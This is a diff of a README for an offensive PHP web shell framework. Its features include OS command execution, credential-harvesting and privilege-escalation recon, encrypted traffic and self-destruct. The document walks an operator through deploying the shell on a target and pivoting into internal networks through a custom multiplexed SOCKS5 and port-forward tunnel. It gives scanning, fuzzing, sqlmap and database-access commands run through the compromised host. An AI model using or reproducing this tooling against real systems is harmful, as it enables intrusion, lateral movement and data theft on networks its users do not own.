@@ -15,9 +15,10 @@ A modular, single-file web shell framework with a build generator. Source module
 
 - **PHP Console** — execute PHP code with error handling, configurable timeout, and fatal error recovery
 - **OS Shell** — auto-detected command execution (probes `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`) with persistent CWD and command history
-- **SOCKS5 Tunnel** — embedded [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) endpoint for pivoting through the compromised host
+- **Multiplexed Tunnel (WebTun)** — built-in HTTP tunnel with SOCKS5 proxy and port forwarding. Multiplexes hundreds of channels over a single HTTP connection. Works on hardened cPanel environments (see [Tunnel & Pivoting](#tunnel--pivoting))
+- **Port Scanner** — parallel TCP/UDP scanner with async connect, banner grabbing, TLS cert inspection, and service fingerprinting. Runs server-side — no tunnel overhead
 - **File Browser** — navigate, download, upload, delete. Shows permissions, owner:group, symlink targets, R/W flags
-- **System Diagnostics** — 30+ recon checks for privilege escalation, network pivoting, and credential harvesting (see [Diagnostics](#diagnostics) below)
+- **System Diagnostics** — 30+ recon checks for privilege escalation, network pivoting, and credential harvesting (see [Diagnostics](#diagnostics))
 - **Command History** — persistent history with re-run, export, and IndexedDB storage
 - **Auto-Randomized Themes** — every build gets a unique color palette by default, with 6 named presets and custom accent support
 - **Traffic Encryption** — AES-256-CBC encrypts all request/response payloads when password protection is enabled, key derived from login password
@@ -31,8 +32,8 @@ A modular, single-file web shell framework with a build generator. Source module
 python generate.py
 
 # Password-protected with tunnel
-python3 neoreg.py -g -k tunnelpass
-python generate.py --tunnel neoreg_servers/tunnel.php --password s3cret --minify
+python3 webtun/webtun.py --generate -k tunnelpass
+python generate.py --tunnel webtun/webtun_servers/tunnel.php --password s3cret --minify
 
 # Minimal build
 python generate.py --exclude tunnel,diagnostics
@@ -54,7 +55,7 @@ Output lands in `dist/`. Deploy the single `.php` file to a web server.
 | Flag | Description |
 |------|-------------|
 | `--password SECRET` | SHA256 password protection (plaintext never stored) |
-| `--tunnel FILE` | Embed Neo-reGeorg tunnel (from `neoreg.py -g`) |
+| `--tunnel FILE` | Embed tunnel PHP (WebTun or Neo-reGeorg) |
 | `--seed STRING` | Operator seed for unique fingerprinting |
 | `--minify` | Strip comments, collapse whitespace |
 | `--exclude MODULES` | Comma-separated: `tunnel`, `diagnostics`, `history` |
@@ -63,69 +64,164 @@ Output lands in `dist/`. Deploy the single `.php` file to a web server.
 | `--output NAME` | Custom output filename |
 | `--verify FILE` | Check integrity of a generated shell |
 
-## SOCKS5 Tunnel & Pivoting
+## Tunnel & Pivoting
 
-The tunnel embeds a Neo-reGeorg endpoint directly into the shell, creating a SOCKS5 proxy through the compromised host. This lets you use your own tools against the internal network.
+Shells-X includes **WebTun** — a multiplexed HTTP tunnel that creates a SOCKS5 proxy through the compromised host. Unlike traditional SOCKS5-over-HTTP tunnels (Neo-reGeorg, reGeorg), WebTun multiplexes all channels over a single HTTP connection with binary framing, encrypted transport, and real-time streaming. This eliminates the per-connection overhead that causes false positives/negatives in port scanning and fuzzing.
+
+### Why WebTun over Neo-reGeorg?
+
+| | Neo-reGeorg | WebTun |
+|--|-------------|--------|
+| Connections | 1 HTTP request per TCP connection | All channels multiplexed over 1 connection |
+| Downstream | Client polls for data | Real-time streaming (flush) |
+| Upstream | 1 POST per write | Batched POSTs (multiple frames per request) |
+| PHP-FPM workers | 1 per active connection | 1 total for all channels |
+| Scanning accuracy | False positives/negatives from timeouts | Accurate open/closed/filtered states |
+| Fuzzing | ~5-50 req/s, unreliable results | ~200-500 req/s, clean results |
+| Hardened hosts | Requires exec for some features | Only needs `stream_socket_client` + `stream_select` |
+| Encryption | Basic XOR | AES-256-CBC + HMAC-SHA256 |
 
 ### Setup
 
 ```bash
-# 1. Generate tunnel key
-python3 neoreg.py -g -k mypassword
+# 1. Generate tunnel server with password (creates webtun_servers/tunnel.php)
+python3 webtun/webtun.py --generate -k mypassword
 
-# 2. Build with tunnel embedded
-python generate.py --tunnel neoreg_servers/tunnel.php --password shellpass
+# 2. Build shell with tunnel embedded
+python generate.py --tunnel webtun/webtun_servers/tunnel.php --password shellpass
 
-# 3. Deploy shell, then connect (--skip required for embedded mode)
-python3 neoreg.py -u https://target.com/shell.php -k mypassword --skip
+# 3. Deploy shell.php to target, then connect from attacker machine
+python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword --socks 1080
+```
 
-# 4. Proxy traffic through the target
-proxychains ssh user@10.0.0.5
-proxychains mysql -h 10.0.0.3 -u root -p
+Requires `aiohttp` and `cryptography` on the attacker machine:
+```bash
+cd webtun && python3 -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt
+```
+
+### Port forwarding vs SOCKS5 — when to use which
+
+Port forwarding (`-L`) creates a direct TCP pipe — your tool connects to a local port, bytes flow straight through the tunnel to the target. No SOCKS handshake, no proxychains, no LD_PRELOAD hooking. The tool doesn't even know it's going through a tunnel. This is **always faster and more reliable** than SOCKS5 for targeted access.
+
+SOCKS5 adds a per-connection negotiation layer (greeting → method → CONNECT → reply → data) and requires the tool to support SOCKS or be wrapped with proxychains. Use it only when you need dynamic destination routing (subnet scanning, browsing multiple hosts).
+
+| Use case | Best approach | Why |
+|----------|--------------|-----|
+| Hit one specific service (MySQL, Redis, web app) | `-L` port forward | Zero overhead, tool works natively |
+| Fuzz one web app | `-L 8080:target:80` + ffuf on localhost | ffuf gets a clean TCP pipe, full speed |
+| Scan a known host's ports | `-L` or built-in scanner | No SOCKS negotiation per probe |
+| Scan an entire subnet | SOCKS5 (`--socks`) | Can't pre-define `-L` for 254 hosts |
+| Browse multiple internal sites | SOCKS5 + browser | Dynamic destinations |
+| Tool doesn't support SOCKS | `-L` port forward | Works with literally everything |
+
+**In practice**: use `-L` for everything targeted, SOCKS5 only for discovery/dynamic work. You can combine both in one session:
+
+```bash
+python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword \
+  --socks 1080 \
+  -L 8080:internal-web:80 \
+  -L 13306:db-server:3306 \
+  -L 16379:cache:6379
+```
+
+SOCKS5 for nmap subnet discovery, port forwards for everything you interact with.
+
+### Port forwarding examples
+
+```bash
+# Forward specific services
+python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword \
+  -L 13306:10.0.0.5:3306 \
+  -L 16379:10.0.0.5:6379 \
+  -L 8080:internal-web:80
+
+# Connect directly — no proxy config needed, works with any tool
+mysql -h 127.0.0.1 -P 13306 -u root -p
+redis-cli -p 16379
+curl http://127.0.0.1:8080/
+sqlmap -u "http://127.0.0.1:8080/page?id=1" --batch
+ffuf -u http://127.0.0.1:8080/FUZZ -w wordlist.txt
+ssh -p 2222 user@127.0.0.1   # with -L 2222:10.0.0.1:22
+```
+
+### SOCKS5 proxy examples
+
+```bash
+# Start with SOCKS5 enabled (default port 1080)
+python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword --socks 1080
+
+# Curl — use socks5h:// to resolve DNS through the tunnel
+curl --proxy socks5h://127.0.0.1:1080 http://internal-app/
+curl --proxy socks5h://127.0.0.1:1080 http://10.0.0.5:8080/api/health
+
+# Fuzzing through SOCKS5
+ffuf -u http://10.0.0.5/FUZZ -w wordlist.txt -x socks5://127.0.0.1:1080
+gobuster dir -u http://10.0.0.5 -w wordlist.txt --proxy socks5://127.0.0.1:1080
+
+# Browser
 chromium --proxy-server="socks5://127.0.0.1:1080"
+
+# SSH through tunnel
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@10.0.0.5
 ```
 
 ### Nmap through the tunnel
 
-Nmap defaults to raw sockets and ICMP which can't traverse SOCKS5. Use these flags:
+Nmap uses `--proxies` (plural) with `socks4://` — it does NOT support `socks5://` or the `--proxy` flag.
 
 ```bash
-# Port scan
-proxychains nmap -sT -Pn -n --unprivileged -T3 \
-  --max-rtt-timeout 2s --max-retries 1 \
-  -p 21,22,80,443,445,3306,3389,5432,6379,8080,8443 10.0.0.0/24
+# Subnet scan
+nmap -sT -Pn -n --proxies socks4://127.0.0.1:1080 10.0.0.0/24 -p 80,443,3306,6379,8080
 
-# With service detection (slower)
-proxychains nmap -sT -Pn -n --unprivileged -sV -T3 \
-  --max-rtt-timeout 2s 10.0.0.1 -p 80,443,3306
+# Service detection on specific host
+nmap -sT -Pn -n --proxies socks4://127.0.0.1:1080 10.0.0.5 -p 1-1000 -sV
+
+# Full port scan
+nmap -sT -Pn -n --proxies socks4://127.0.0.1:1080 10.0.0.5 -p 1-65535
 ```
 
 | Flag | Why |
 |------|-----|
 | `-sT` | TCP connect scan — only type that works through SOCKS |
-| `-Pn` | Skip host discovery — ICMP can't go through SOCKS5 |
-| `-n` | No DNS resolution — prevents leaks and assertion errors |
-| `--unprivileged` | Disable raw socket operations |
-| `-T3` | Normal timing — T4/T5 overwhelm the tunnel |
-| `--max-rtt-timeout 2s` | Prevent hangs on slow responses |
-| `--max-retries 1` | Don't retry through the slow tunnel |
+| `-Pn` | Skip host discovery — ICMP can't traverse SOCKS |
+| `-n` | No DNS resolution — nmap resolves locally, internal hostnames won't work. For hostname resolution through the tunnel, use curl with `socks5h://` instead |
+| `--proxies socks4://` | Nmap's required format. NOT `--proxy`, NOT `socks5://` |
 
-Optional `proxychains.conf` tuning:
+### WebTun client options
+
+| Flag | Description |
+|------|-------------|
+| `-u URL` | Shell URL |
+| `-k KEY` | Tunnel password |
+| `--socks PORT` | SOCKS5 listen port (default: 1080, 0 to disable) |
+| `-L local:host:port` | Port forward (repeatable) |
+| `--upstream-pool N` | Upstream HTTP connections (default: 3) |
+| `--batch-ms MS` | Upstream batching window in ms (default: 5) |
+| `--no-verify-ssl` | Skip TLS certificate verification |
+| `-v` | Debug logging |
+
+### Built-in port scanner (no tunnel needed)
+
+The Scanner tab runs a parallel port scanner **server-side in PHP** — no tunnel overhead, no SOCKS5. Direct `stream_socket_client()` from the web server to targets. Supports:
+
+- TCP and UDP scanning with configurable concurrency (up to 512 parallel connections)
+- Banner grabbing + service fingerprinting (SSH, HTTP, MySQL, Redis, PostgreSQL, etc.)
+- TLS certificate inspection
+- CIDR notation, IP ranges, port ranges
+- Pause/resume/stop controls
+- Results stored in IndexedDB with export
+
+For network discovery, use the built-in scanner (faster, more accurate). For interactive tool access, use the tunnel with `-L` port forwards. For dynamic routing to unknown hosts, use the SOCKS5 proxy.
+
+### Legacy: Neo-reGeorg
+
+Neo-reGeorg is still supported via the same `--tunnel` flag:
+
+```bash
+python3 neoreg.py -g -k mypassword
+python generate.py --tunnel neoreg_servers/tunnel.php --password shellpass
+python3 neoreg.py -u https://target.com/shell.php -k mypassword --skip
 ```
-tcp_read_time_out 3000
-tcp_connect_time_out 3000
-```
-
-### What works / doesn't work through SOCKS5
-
-| Works | Doesn't work |
-|-------|-------------|
-| TCP connect scans (`nmap -sT`) | SYN scans (`nmap -sS`) — raw sockets |
-| Service fingerprinting (`nmap -sV`) | UDP scans — SOCKS5 is TCP only |
-| HTTP tools (curl, sqlmap, gobuster) | ICMP/ping — raw packets |
-| DB clients (mysql, psql, redis-cli) | OS fingerprinting (`nmap -O`) |
-| SSH, netcat, socat | Nmap scripts (`-sC`) — most use raw sockets/UDP |
-| Chromium/Firefox via SOCKS5 proxy | ARP scanning — Layer 2 |
 
 ## Diagnostics
 
@@ -255,27 +351,62 @@ python generate.py --password "hunter2"
 
 SHA256 hash embedded — plaintext never stored. Logout via `?logout`.
 
+## Development
+
+A Docker-based dev setup is included for rapid iteration:
+
+```bash
+# Start dev containers (PHP 8.2 + Apache, nginx/mysql/redis targets)
+docker compose -f dev/docker-compose.yml up -d
+
+# Build shell (output is volume-mounted — changes are instant)
+python generate.py --output dev.php --theme ocean
+
+# Open http://localhost:8888/dev.php
+
+# Auto-rebuild on source changes
+cd dev && ./watch.sh --theme ocean
+```
+
+Internal target services for testing scanner and tunnel:
+
+| Service | Hostname (from shell) | Port |
+|---------|----------------------|------|
+| nginx | `target-web` | 80 |
+| MySQL 8.0 | `target-mysql` | 3306 |
+| Redis | `target-redis` | 6379 |
+
 ## Project Structure
 
 ```
-Webshells/
+Shells-X/
 ├── generate.py                  # Build tool (Python 3, zero deps)
 ├── templates/php.tpl            # Single-file PHP template
 ├── src/
 │   ├── config/defaults.json     # Module definitions
 │   ├── backend/php/
 │   │   ├── _order.json          # Assembly order
-│   │   ├── download.php         # GET file download
+│   │   ├── crypto.php           # AES-256-CBC request/response encryption
+│   │   ├── scanner.php          # Parallel TCP/UDP port scanner
 │   │   ├── filebrowser.php      # Directory listing
 │   │   ├── fileops.php          # Delete + upload
 │   │   ├── eval.php             # PHP code execution
 │   │   ├── shell.php            # OS command execution
-│   │   └── diagnostics.php      # System recon + privesc checks
+│   │   ├── diagnostics.php      # System recon + privesc checks
+│   │   └── destruct.php         # Self-destruct handler
 │   └── frontend/
 │       ├── css/shell.css        # Dark theme
 │       ├── html/layout.html     # Layout with module markers
-│       └── js/                  # core, db, console, shell, tunnel,
-│                                # diagnostics, history, filebrowser
+│       └── js/                  # core, crypto, db, console, shell, tunnel,
+│                                # scanner, diagnostics, history, filebrowser
+├── webtun/                      # Multiplexed HTTP tunnel
+│   ├── webtun.py                # Python client + server generator
+│   ├── templates/tunnel.php     # PHP server template
+│   ├── requirements.txt         # aiohttp, cryptography
+│   └── webtun_servers/          # Generated output (gitignored)
+├── dev/                         # Development environment
+│   ├── docker-compose.yml       # PHP + target services
+│   └── watch.sh                 # Auto-rebuild file watcher
 └── dist/                        # Generated shells (gitignored)
 ```
 
@@ -291,7 +422,8 @@ Webshells/
 ## Requirements
 
 - **Generator:** Python 3.6+ (stdlib only)
-- **Runtime:** PHP 5.6+ (fsockopen needed for tunnel)
+- **Runtime:** PHP 5.6+ (`stream_socket_client` needed for tunnel and scanner)
+- **Tunnel client:** Python 3.8+ with `aiohttp`, `cryptography`
 - **Browser:** Any modern browser with IndexedDB
 
 ## License
